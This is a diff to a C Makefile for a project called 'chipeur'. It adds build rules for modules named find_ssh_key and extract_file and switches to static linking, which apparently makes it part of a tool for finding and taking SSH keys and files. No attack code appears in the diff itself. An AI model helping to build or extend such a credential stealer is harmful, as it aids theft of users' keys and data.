@@ -6,11 +6,13 @@ INCLUDE_DIR=include/
 OBJ_DIR=obj/
 
 # add the object file used here
-OBJ_FILES=$(OBJ_DIR)chipeur.o
+OBJ_FILES=$(OBJ_DIR)chipeur.o $(OBJ_DIR)find_ssh_key.o $(OBJ_DIR)extract_file.o
 
 CC=gcc
-CFLAGS=-g -fPIE -O2 -Warray-bounds -Wsequence-point -Walloc-zero -Wnull-dereference \
--Wpointer-arith -Wcast-qual -Wcast-align=strict -I$(INCLUDE_DIR)
+
+# -Walloc-zero
+CFLAGS=-g -static -fPIE -O2 -Warray-bounds -Wsequence-point -Wnull-dereference \
+-Wpointer-arith -Wcast-qual -Wcast-align -I$(INCLUDE_DIR)
 
 # not needed for now
 LDFLAGS= # -Wl,--strip-all
@@ -28,9 +30,14 @@ all: chipeur
 #	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@
 
 # Create the object files
-$(OBJ_DIR)chipeur.o : $(SRC_DIR)chipeur.c $(INCLUDE_DIR)chipeur.h
+$(OBJ_DIR)chipeur.o : $(SRC_DIR)chipeur.c $(INCLUDE_DIR)chipeur.h $(INCLUDE_DIR)find_ssh_key.h
 	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@
 
+$(OBJ_DIR)find_ssh_key.o : $(SRC_DIR)find_ssh_key.c $(INCLUDE_DIR)find_ssh_key.h $(INCLUDE_DIR)extract_file.h
+	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@
+
+$(OBJ_DIR)extract_file.o : $(SRC_DIR)extract_file.c $(INCLUDE_DIR)extract_file.h
+	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@
 
 # make the binary
 chipeur: $(OBJ_FILES)
